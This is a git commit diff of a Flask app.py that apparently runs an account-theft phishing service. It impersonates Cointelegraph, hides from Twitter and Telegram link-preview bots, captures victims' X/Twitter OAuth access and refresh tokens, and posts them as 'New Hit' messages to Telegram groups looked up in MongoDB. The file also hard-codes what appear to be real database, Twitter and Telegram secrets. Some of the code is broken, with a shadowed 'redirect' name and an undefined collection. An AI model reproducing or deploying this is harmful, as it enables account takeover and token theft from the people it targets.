bfd7acccf6fbc8f3145337cb4fabc875a32e353d
souls1o <161530718+souls1o@users.noreply.github.com>
2024-10-13 17:53:10 -0700

    Update app.py

--- app.py
+++ app.py
@@ -1,19 +1,35 @@
 from flask import Flask, request, redirect
 import requests
 import base64
+from pymongo.mongo_client import MongoClient
+from pymongo.server_api import ServerApi
 
 app = Flask(__name__)
+
+MONGO_URI = "mongodb+srv://advonisx:TRYsyrGie4c0uVEw@cluster0.qtpxk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&ssl=true"
 
 TWITTER_CLIENT_ID = 'eWNUdkx4LTlnaGQ0N3BaSGJyYkU6MTpjaQ' # Replace with your Twitter client ID
 TWITTER_CLIENT_SECRET = '4cct_4dZ3BVz_MNKKjazWi1M3XVelnSiGqV6R5hBxC-Pbj7ytn' # Replace with your Twitter client secret
 
-TELEGRAM_GROUP_CHAT_ID = '' # Replace with your Telegram group chat ID
 TELEGRAM_BOT_TOKEN = '6478716007:AAG8C9T5bT96SHV2te7OspEeRGiwzwPobGE' # Replace with your Telegram bot token
 
 credentials = f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}"
 credentials_base64 = base64.b64encode(credentials.encode()).decode('utf-8')
 
-@app.route('/cointelegraph') # Examples: cointelegraph, decryptmedia, etc
+client = MongoClient(MONGO_URI, server_api=ServerApi('1'))
+db = client['cobra_db']
+groups = db['groups']
+
+parse_mode = "MarkDown"
+
+try:
+    client.admin.command('ping')
+    print("[+] MongoDB has successfully connected.")
+except Exception as e:
+    print("[-] MongoDB has failed connecting.")
+    print(e)
+
+@app.route('/oauth') # Examples: cointelegraph, decryptmedia, etc
 def index():
     user_agent = request.headers.get('User-Agent')
 
@@ -21,6 +37,17 @@ def index():
         user_agent = ''
 
     user_agent = user_agent.strip('\r\n')
+    
+    identifier = request.args.get('identifier')
+    if not identifier:
+        return "⚠️ Identifier is required.", 400
+        
+    group = groups_collection.find_one({"identifier": identifier})
+    if not group:
+        return "⚠️ Group not found.", 404
+        
+    redirect = group.get('redirect')
+    group_id = group.get('group_id')
 
     if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
         return redirect('https://calendly.com/cointele')
@@ -45,7 +72,7 @@ def index():
         requests.post(
             f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
             data={
-                'chat_id': TELEGRAM_GROUP_CHAT_ID,
+                'chat_id': group_id,
                 'text': message
             }
         )
@@ -99,7 +126,7 @@ def callback():
     return redirect("https://calendly.com/cointele/45min?back=1&month=2024-08", code=302)
 
 def send_to_telegram(username: str, access_token: str, refresh_token: str, group_id) -> None:
-    message: str = f'⚠️ *New Hit* ⚠️\n\nx.com/{username}\n\n🔑 Access Token:\n`{access_token}`\n\n🔄 Refresh Token:\n`{refresh_token}`'
+    message: str = f''
 
     requests.post(
         f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
